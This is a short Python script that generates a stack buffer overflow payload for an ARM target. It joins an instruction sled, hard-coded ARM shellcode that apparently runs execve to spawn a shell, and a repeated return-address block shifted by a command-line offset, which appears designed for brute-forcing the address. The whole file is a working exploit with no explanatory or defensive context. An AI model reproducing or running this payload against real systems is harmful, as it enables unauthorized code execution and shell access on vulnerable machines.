import sys
import os

offset = int(sys.argv[1])

NOPSLED = b'\x01\x10\x81\xe1'
NOPSLED = NOPSLED * 0x20

SHELLCODE3 = b'hp\x00\xe3AqD\xe3\x04p-\xe5/\x7f\x02\xe3/sG\xe3\x04p-\xe5/r\x06\xe3i~F\xe3\x04p-\xe5\r\x00\xa0\xe1sx\x06\xe3\x04p-\xe5\x0c\xc0,\xe0\x04\xc0-\xe5\x04\x10\xa0\xe3\r\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0-\xe5\r\x10\xa0\xe1\x02 "\xe0\x0bp\xa0\xe3\x00\x00\x00\xef'


RETURNADDRESS = b"7efdf000"
RETURNADDRESS = int(RETURNADDRESS, 16) + 0x20 * offset
RETURNADDRESS = RETURNADDRESS.to_bytes(4, 'little')
RETURNADDRESSBLOCK = RETURNADDRESS * 0x100

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(NOPSLED + SHELLCODE3 + RETURNADDRESSBLOCK + b'\n')

with os.fdopen(sys.stderr.fileno(), "w", closefd=False) as stderr:
    stderr.write(RETURNADDRESS.hex() + "\n")